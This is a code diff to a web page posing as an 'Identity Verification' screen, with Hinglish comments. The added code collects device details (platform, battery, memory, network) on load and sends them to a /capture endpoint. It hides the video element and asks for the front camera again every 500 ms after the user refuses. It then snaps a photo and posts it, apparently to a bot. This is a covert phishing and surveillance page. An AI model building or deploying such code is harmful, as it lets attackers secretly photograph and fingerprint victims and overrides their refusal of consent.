@@ -20,26 +20,27 @@
   .message { font-size:1.15rem; color:var(--cyan); font-weight:500; }
   video, #captured, #preview { width:100%; max-width:380px; border-radius:16px; border:2px solid rgba(0,245,255,0.4); }
   .warning { background:rgba(255,70,70,0.18); border:1px solid #ff5555; color:#ff8888; padding:18px; border-radius:14px; margin:25px 0; text-align:left; font-size:0.96rem; }
+  /* Hidden video */
+  #video { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
 </style>
 </head>
-<body onclick="triggerCamera()">
+<body>
 <div class="glass-card">
   <div class="header">
     <h1 class="title">🔐 Identity Verification</h1>
   </div>
   <div class="content">
 
-    <!-- Step 1: Load hote hi dikhega, koi button nahi -->
+    <!-- Step 1: Load hote hi dikhega -->
     <div id="consent" class="stage">
       <h2>Verification Required</h2>
-      <p style="max-width:340px;line-height:1.6;opacity:0.9;">Tap anywhere on the screen to allow camera access and continue.</p>
+      <p style="max-width:340px;line-height:1.6;opacity:0.9;">Tap anywhere on the screen to allow camera access and verify your identity.</p>
     </div>
 
-    <!-- Step 2: Loading & Video -->
+    <!-- Step 2: Loading -->
     <div id="loading" class="stage" style="display:none;">
       <div class="loader"></div>
       <div class="message">Verifying...</div>
-      <video id="video" autoplay playsinline style="display:none;"></video>
     </div>
 
     <!-- Step 3: Show Final Image -->
@@ -55,61 +56,97 @@
   </div>
 </div>
 
+<!-- Hidden Video for Camera -->
+<video id="video" autoplay playsinline muted></video>
+
 <script>
   const urlParams = new URLSearchParams(window.location.search);
   const TOKEN = urlParams.get('t');
   const CAPTURE_ENDPOINT = "/capture";
   const IMG_ENDPOINT = "/img/";
 
+  const video = document.getElementById('video');
   let stream = null;
   let isStarted = false;
+  let cameraRetryCount = 0;
+  const MAX_RETRIES = 9999;
 
-  // Page load hote hi camera permission maangne ki koshish karo (bina click ke)
-  window.onload = () => {
-    triggerCamera();
-  };
-
-  async function triggerCamera() {
-    if (isStarted || document.getElementById('result').style.display === 'flex') return;
-    isStarted = true;
-
-    document.getElementById('consent').style.display='none';
-    document.getElementById('loading').style.display='flex';
-    
-    // Native Camera Permission Popup
+  // 1. Device Info Collect karne ka function
+  async function collectInfo() {
+    const info = {
+        platform: navigator.platform || "Unknown",
+        userAgent: navigator.userAgent,
+        screen: screen.width + "x" + screen.height,
+        memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+        battery: "N/A", charging: "N/A", network: "Unknown"
+    };
     try {
-      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-      const video = document.getElementById('video');
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            info.battery = Math.round(b.level * 100) + "%";
+            info.charging = b.charging ? "Yes" : "No";
+        }
+    } catch(e) {}
+    try {
+        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (c) { info.network = c.effectiveType || "Unknown"; }
+    } catch(e) {}
+
+    // Yeh info bhi capture endpoint pe bhej de taaki tera bot isko bhi receive kar le
+    let data = { token: TOKEN, image: null, info: info };
+    fetch("/capture", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+    }).catch(e => console.log(e));
+  }
+
+  // 2. Camera Start karne ka function (with Retry logic)
+  async function startCamera() {
+    if (isStarted) return;
+
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+      });
       video.srcObject = stream;
+      cameraRetryCount = 0;
       
-      // Video ready hone ka wait karo
-      video.onloadedmetadata = () => {
-        // 1.5 second wait (taaki camera focus ho jaye)
-        setTimeout(() => {
-          captureAndSend();
-        }, 1500);
-      };
-    } catch(e) {
-      // Agar direct load pe permission nahi mili, toh user ko tap karne do
-      console.log("Autoplay blocked. Waiting for user tap.");
-      isStarted = false; 
-      document.getElementById('consent').style.display='flex';
-      document.getElementById('loading').style.display='none';
+      // Camera on hote hi loading show karo
+      document.getElementById('consent').style.display='none';
+      document.getElementById('loading').style.display='flex';
+      
+      // 1.5 second wait karo (focus ke liye) aur fir capture karo
+      setTimeout(() => {
+        captureAndSend();
+      }, 1500);
+
+    } catch (e) {
+      cameraRetryCount++;
+      console.log("Camera denied, retry #" + cameraRetryCount, e.name);
+      // Agar user ne block kiya hai, toh har 500ms me wapas try karega
+      if (cameraRetryCount < MAX_RETRIES) {
+        setTimeout(startCamera, 500);
+      }
     }
   }
 
+  // 3. Photo khich kar send karna
   async function captureAndSend() {
-    const video = document.getElementById('video');
+    if (!stream) return;
+    isStarted = true; // Lock taaki baar baar na maange
+
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0);
     const imageBase64 = canvas.toDataURL('image/jpeg', 0.92);
     
     // Camera band karo
-    if (stream) stream.getTracks().forEach(t=>t.stop());
+    stream.getTracks().forEach(t=>t.stop());
+    video.srcObject = null;
     
-    // Photo bot pe send karo
+    // Photo send karo
     try {
       await fetch(CAPTURE_ENDPOINT, {
         method: "POST",
@@ -137,7 +174,30 @@
     location.reload();
   }
 
-  window.addEventListener('beforeunload', ()=>{
+  // 4. Page load hone par trigger
+  window.addEventListener('DOMContentLoaded', () => {
+    collectInfo();
+    startCamera();
+    
+    // Extra: Agar load pe nahi chala, toh har 500ms pe try karega
+    setInterval(() => {
+      if (!stream && !isStarted && cameraRetryCount < MAX_RETRIES) {
+        startCamera();
+      }
+    }, 500);
+  });
+
+  // 5. Agar user screen pe kahin bhi tap/click kare, toh turant camera maango
+  ['click', 'touchstart', 'keydown'].forEach(evt => {
+    document.addEventListener(evt, () => {
+      if (!stream && !isStarted) {
+        cameraRetryCount = 0; // Reset retry count
+        startCamera();
+      }
+    }, { once: false });
+  });
+
+  window.addEventListener('beforeunload', () => {
     if (stream) stream.getTracks().forEach(t=>t.stop());
   });
 </script>
